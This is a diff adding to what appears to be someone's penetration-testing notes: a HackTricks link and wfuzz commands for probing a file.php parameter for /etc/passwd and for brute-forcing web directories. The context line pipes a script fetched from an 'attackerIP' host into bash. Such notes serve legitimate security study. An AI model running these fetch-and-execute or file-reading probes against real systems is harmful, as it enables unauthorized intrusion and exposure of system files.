@@ -73,3 +73,25 @@ curl attackerIP:8000/linpeas.sh | bash
 python3 -m http.server
 ```
 
+https://book.hacktricks.xyz/pentesting-web/web-tool-wfuzz
+
+```
+wfuzz -u http://192.168.237.104/file.php?FUZZ=/etc/passwd --hw 14 -w /usr/share/wordlists/dirb/big.txt
+```
+
+```
+wfuzz -u http://192.168.237.104/file.php?FUZZ=/etc/passwd --hw 14 -w /usr/share/wordlists/dirb/big.txt
+```
+
+### Directory & Files Bruteforce
+
+*Filter by whitelisting codes*
+
+```
+wfuzz -c -z file,/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --sc 200,202,204,301,302,307,403 http://example.com/uploads/FUZZ
+```
+
+```
+wfuzz -c -z file,/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --hc 404 http://vulnerable.site/FUZZ
+```
+
